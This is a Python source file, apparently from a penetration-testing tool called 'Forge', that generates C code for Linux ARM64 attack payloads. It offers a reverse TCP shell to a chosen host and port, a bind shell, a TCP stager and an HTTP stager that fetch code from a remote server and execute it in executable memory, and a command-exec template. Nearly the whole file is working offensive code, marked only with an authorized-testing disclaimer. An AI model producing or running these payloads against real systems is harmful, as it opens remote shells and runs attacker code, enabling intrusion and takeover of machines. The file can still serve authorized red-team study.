"""ARM64/AArch64 Shellcode Templates (Linux).

Uses raw Linux AArch64 syscalls (svc #0).
Windows on ARM is supported via the same WinSock2 C templates as x64
but compiled with the aarch64 MinGW cross-compiler.

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import socket
import struct
import textwrap


class ShellcodeARM64:
    """AArch64 (ARM64) shellcode generator."""

    def __init__(self, lhost: str = "127.0.0.1", lport: int = 4444, cmd: str = "/bin/sh"):
        self.lhost = lhost
        self.lport = lport
        self.cmd   = cmd
        try:
            self._host_bytes = socket.inet_aton(lhost)
        except OSError:
            self._host_bytes = b"\x7f\x00\x00\x01"
        self._port_bytes = struct.pack(">H", lport)

    def reverse_tcp(self) -> bytes:
        """ARM64 Linux reverse TCP shell (svc #0 syscalls)."""
        return self._linux_reverse_tcp_c().encode()

    def reverse_tcp_linux(self) -> bytes:
        return self.reverse_tcp()

    def bind_tcp(self) -> bytes:
        """ARM64 Linux bind TCP shell."""
        return self._linux_bind_tcp_c().encode()

    def staged_tcp(self) -> bytes:
        """ARM64 Linux staged TCP stager."""
        return self._linux_staged_tcp_c().encode()

    def staged_http(self) -> bytes:
        return self._linux_staged_http_c().encode()

    def reverse_http(self) -> bytes:
        return self._linux_staged_http_c().encode()

    def exec_cmd(self) -> bytes:
        """ARM64 Linux exec command."""
        return self._linux_exec_c().encode()

    # ── C Source Templates ─────────────────────────────────────────────

    def _linux_reverse_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        try:
            packed = socket.inet_aton(host)
        except OSError:
            packed = b"\x7f\x00\x00\x01"
        port_be = struct.pack(">H", port)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux AArch64 Reverse TCP Shell (svc #0 syscalls)
         * Target:  {host}:{port}
         * Compile: aarch64-linux-gnu-gcc -o shell_arm64 shell.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>
        #include <linux/net.h>

        /* AArch64 syscall numbers */
        #define SYS_socket    198
        #define SYS_connect   203
        #define SYS_dup2      32
        #define SYS_execve    221
        #define SYS_exit_group 94

        static const struct sockaddr_in_raw {{
            unsigned short family;
            unsigned short port;
            unsigned char  ip[4];
            unsigned char  pad[8];
        }} SA = {{
            2,
            (unsigned short)( ((0x{port_be.hex()[0:2]}u) << 8) | 0x{port_be.hex()[2:4]}u ),
            {{ {packed[0]}, {packed[1]}, {packed[2]}, {packed[3]} }},
            {{0}}
        }};

        static long sc(long nr, long a, long b, long c) {{
            long r;
            register long x0 __asm__("x0") = a;
            register long x1 __asm__("x1") = b;
            register long x2 __asm__("x2") = c;
            register long x8 __asm__("x8") = nr;
            __asm__ __volatile__("svc #0" : "=r"(x0) : "r"(x8),"r"(x0),"r"(x1),"r"(x2) : "memory");
            return x0;
        }}

        void _start(void) {{
            long fd = sc(SYS_socket, 2, 1, 6);   /* AF_INET, SOCK_STREAM, IPPROTO_TCP */
            sc(SYS_connect, fd, (long)&SA, 16);
            sc(SYS_dup2, fd, 0, 0);
            sc(SYS_dup2, fd, 1, 0);
            sc(SYS_dup2, fd, 2, 0);
            static const char path[] = "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{path, arg1, 0}};
            sc(SYS_execve, (long)path, (long)argv, 0);
            sc(SYS_exit_group, 1, 0, 0);
        }}
        """)

    def _linux_bind_tcp_c(self) -> str:
        port    = self.lport
        port_be = struct.pack(">H", port)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux AArch64 Bind TCP Shell
         * Listen: 0.0.0.0:{port}
         * Compile: aarch64-linux-gnu-gcc -o bind_arm64 bind.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>

        #define SYS_socket   198
        #define SYS_bind     200
        #define SYS_listen   201
        #define SYS_accept   202
        #define SYS_dup2     32
        #define SYS_execve   221
        #define SYS_close    57
        #define SYS_exit_group 94

        static const struct {{ unsigned short f,p; unsigned ip; char pad[8]; }} SA_B = {{
            2,
            (unsigned short)( ((0x{port_be.hex()[0:2]}u) << 8) | 0x{port_be.hex()[2:4]}u ),
            0, {{0}}
        }};

        static long sc(long nr, long a, long b, long c) {{
            long r;
            register long x0 __asm__("x0") = a;
            register long x1 __asm__("x1") = b;
            register long x2 __asm__("x2") = c;
            register long x8 __asm__("x8") = nr;
            __asm__ __volatile__("svc #0":"=r"(x0):"r"(x8),"r"(x0),"r"(x1),"r"(x2):"memory");
            return x0;
        }}

        void _start(void) {{
            int opt = 1;
            long srv = sc(SYS_socket, 2, 1, 6);
            sc(55, srv, 1, (long)&opt);           /* setsockopt SO_REUSEADDR */
            sc(SYS_bind, srv, (long)&SA_B, 16);
            sc(SYS_listen, srv, 1, 0);
            long cli = sc(SYS_accept, srv, 0, 0);
            sc(SYS_close, srv, 0, 0);
            sc(SYS_dup2, cli, 0, 0);
            sc(SYS_dup2, cli, 1, 0);
            sc(SYS_dup2, cli, 2, 0);
            static const char path[] = "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{path, arg1, 0}};
            sc(SYS_execve, (long)path, (long)argv, 0);
            sc(SYS_exit_group, 1, 0, 0);
        }}
        """)

    def _linux_staged_tcp_c(self) -> str:
        host = self.lhost
        port = self.lport
        try:
            packed = socket.inet_aton(host)
        except OSError:
            packed = b"\x7f\x00\x00\x01"
        port_be = struct.pack(">H", port)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux AArch64 Staged Reverse TCP Stager
         * Stage server: {host}:{port}
         * Protocol: [4-byte LE length][stage shellcode]
         * Compile: aarch64-linux-gnu-gcc -o stager_arm64 stager.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>
        #include <sys/mman.h>

        #define SYS_socket    198
        #define SYS_connect   203
        #define SYS_read      63
        #define SYS_mmap      222
        #define SYS_exit_group 94

        static const struct {{ unsigned short f,p; unsigned char ip[4]; char pad[8]; }} SA = {{
            2,
            (unsigned short)( ((0x{port_be.hex()[0:2]}u) << 8) | 0x{port_be.hex()[2:4]}u ),
            {{ {packed[0]}, {packed[1]}, {packed[2]}, {packed[3]} }},
            {{0}}
        }};

        static long sc(long nr, long a, long b, long c) {{
            long r;
            register long x0 __asm__("x0") = a;
            register long x1 __asm__("x1") = b;
            register long x2 __asm__("x2") = c;
            register long x8 __asm__("x8") = nr;
            __asm__ __volatile__("svc #0":"=r"(x0):"r"(x8),"r"(x0),"r"(x1),"r"(x2):"memory");
            return x0;
        }}

        static void read_all(long fd, char *buf, long len) {{
            long t=0,r;
            while(t<len){{ r=sc(SYS_read,fd,(long)(buf+t),len-t); if(r<=0)sc(SYS_exit_group,1,0,0); t+=r; }}
        }}

        void _start(void) {{
            long fd = sc(SYS_socket, 2, 1, 6);
            sc(SYS_connect, fd, (long)&SA, 16);
            unsigned int stage_len = 0;
            read_all(fd, (char*)&stage_len, 4);
            if (!stage_len || stage_len > 32*1024*1024) sc(SYS_exit_group, 1, 0, 0);
            long stage = sc(SYS_mmap, 0, (long)stage_len,
                            PROT_READ|PROT_WRITE|PROT_EXEC,
                            MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            if (stage < 0) sc(SYS_exit_group, 1, 0, 0);
            read_all(fd, (char*)stage, (long)stage_len);
            /* Call stage(fd) */
            ((void(*)(long))stage)(fd);
            sc(SYS_exit_group, 0, 0, 0);
        }}
        """)

    def _linux_staged_http_c(self) -> str:
        """ARM64 staged HTTP stager using curl subprocess (libcurl dependency)."""
        host = self.lhost
        port = self.lport

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux AArch64 Staged HTTP Stager
         * Stage URL: http://{host}:{port}/stage
         * Compile: aarch64-linux-gnu-gcc -o http_stager_arm64 stager.c -lcurl -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <stdlib.h>
        #include <string.h>
        #include <sys/mman.h>
        #include <curl/curl.h>

        static struct {{ char *data; size_t len; }} g_buf = {{NULL, 0}};

        static size_t write_cb(void *p, size_t sz, size_t n, void *ud) {{
            size_t total = sz * n;
            g_buf.data = realloc(g_buf.data, g_buf.len + total + 1);
            memcpy(g_buf.data + g_buf.len, p, total);
            g_buf.len += total;
            return total;
        }}

        int main(void) {{
            curl_global_init(CURL_GLOBAL_DEFAULT);
            CURL *c = curl_easy_init();
            curl_easy_setopt(c, CURLOPT_URL, "http://{host}:{port}/stage");
            curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
            curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_perform(c);
            curl_easy_cleanup(c);

            if (!g_buf.data || !g_buf.len) return 1;

            void *stage = mmap(NULL, g_buf.len, PROT_READ|PROT_WRITE|PROT_EXEC,
                               MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            memcpy(stage, g_buf.data, g_buf.len);
            ((void(*)())stage)();
            return 0;
        }}
        """)

    def _linux_exec_c(self) -> str:
        cmd = self.cmd
        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux AArch64 Execute Command
         * Command: {cmd}
         * Compile: aarch64-linux-gnu-gcc -o exec_arm64 exec.c -s -O2
         */
        #include <stdlib.h>
        int main(void) {{ return system("{cmd}"); }}
        """)
